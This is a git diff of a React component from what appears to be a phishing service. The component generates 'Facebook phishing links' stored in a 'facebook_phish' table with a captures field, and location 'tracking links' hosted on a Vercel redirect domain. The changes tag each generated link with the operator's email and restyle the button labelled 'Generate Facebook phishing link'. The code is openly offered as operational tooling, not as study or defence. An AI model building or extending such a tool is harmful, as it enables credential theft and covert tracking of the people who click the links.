@@ -6,6 +6,7 @@ export default function LinkGenerator({ onNewLink, onlyFacebook }) {
   const [destino, setDestino] = useState('');
   const [erro, setErro] = useState('');
   const [tipo, setTipo] = useState(onlyFacebook ? 'facebook' : 'location'); // 'location' ou 'facebook'
+  const usuario = localStorage.getItem('usuario');
 
   // Se onlyFacebook, sempre força tipo facebook
   if (onlyFacebook && tipo !== 'facebook') setTipo('facebook');
@@ -22,7 +23,7 @@ export default function LinkGenerator({ onNewLink, onlyFacebook }) {
       url = 'https://redirect-online.vercel.app/redirect/' + id;
       setLink(url);
       const { error } = await supabase.from('links').insert([
-        { id, url, destino, acessos: [] }
+        { id, url, destino, acessos: [], email: usuario }
       ]);
       if (error) {
         setErro('Error saving link: ' + error.message);
@@ -33,7 +34,7 @@ export default function LinkGenerator({ onNewLink, onlyFacebook }) {
       url = 'https://redirect-online.vercel.app/facebook/' + id;
       setLink(url);
       const { error } = await supabase.from('facebook_phish').insert([
-        { id, url, capturas: [] }
+        { id, url, capturas: [], email: usuario }
       ]);
       if (error) {
         setErro('Error saving phishing link: ' + error.message);
@@ -74,16 +75,16 @@ export default function LinkGenerator({ onNewLink, onlyFacebook }) {
         />
       )}
       <button onClick={gerarLink} style={{
-        background: 'var(--vermelho-paixao)',
-        color: 'var(--branco-confissao)',
-        borderRadius: 8,
-        padding: '0.75rem 2rem',
-        fontFamily: 'Montserrat',
-        fontWeight: 'bold',
-        fontSize: '1.1rem',
+        background: 'linear-gradient(90deg, #00c6ff 0%, #0072ff 100%)',
+        color: '#fff',
         border: 'none',
-        cursor: 'pointer',
-        transition: 'background 0.2s',
+        borderRadius: 12,
+        padding: '0.9rem 2.2rem',
+        fontSize: '1.1rem',
+        fontFamily: 'Inter',
+        fontWeight: 600,
+        boxShadow: '0 2px 12px 0 rgba(0,198,255,0.18)',
+        transition: 'box-shadow 0.2s, background 0.2s',
         marginTop: 8
       }}>{onlyFacebook ? 'Generate Facebook link' : (tipo === 'location' ? 'Generate tracking link' : 'Generate Facebook phishing link')}</button>
       {erro && <div style={{ color: 'var(--erro)', marginTop: 8 }}>{erro}</div>}
